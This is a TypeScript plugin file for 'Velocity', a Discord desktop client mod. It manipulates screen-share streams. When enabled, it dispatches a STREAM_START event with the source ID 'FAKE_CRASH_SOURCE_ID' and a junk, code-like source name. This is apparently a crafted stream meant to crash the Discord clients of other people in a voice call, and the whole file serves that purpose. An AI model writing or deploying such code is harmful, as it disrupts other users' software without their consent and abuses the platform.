/*
 * Velocity, a modification for Discord's desktop app
 * Copyright (c) 2022 Vendicated and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import { findByPropsLazy } from "@webpack";
import { FluxDispatcher, SelectedChannelStore, UserStore } from "@webpack/common";

export let lastRealSourceId: string | null = null;

const StreamStore = findByPropsLazy("getActiveStreamForUser");

export function setLastRealSourceId(sourceId: string | null) {
    lastRealSourceId = sourceId;
}

export async function getSourceId(isEnabled: boolean) {
    if (isEnabled) return "FAKE_CRASH_SOURCE_ID";

    if (lastRealSourceId) {
        return lastRealSourceId;
    }

    const sources = await DiscordNative.desktopCapture.getDesktopCaptureSources({
        types: ["screen"]
    });
    return sources[0]?.id ?? "default";
}

export function updateStream(isEnabled: boolean) {
    const channelId = SelectedChannelStore.getVoiceChannelId();
    if (!channelId) return;

    const id = UserStore.getCurrentUser()?.id;
    const isStreaming = StreamStore.getActiveStreamForUser(id) != null;
    if (!isStreaming) return;

    (async () => {
        const sourceId = await getSourceId(isEnabled);

        try {
            FluxDispatcher.dispatch({
                type: "STREAM_START",
                streamType: "call",
                guildId: null,
                channelId,
                appContext: "APP",
                sourceId: sourceId,
                sourceName: isEnabled ? "$1}),$self,tGs47 void" : "Screen 1",
                sourceIcon: "",
                sound: true,
                previewDisabled: false,
                goLiveModalDurationMs: 2000 + Math.random() * 300,
                analyticsLocations: [
                    "channel call",
                    "voice control tray",
                    "go live modal v2"
                ],
                quality: {
                    resolution: 1080,
                    frameRate: 60
                }
            });
        } catch (err) {
        }
    })();
}
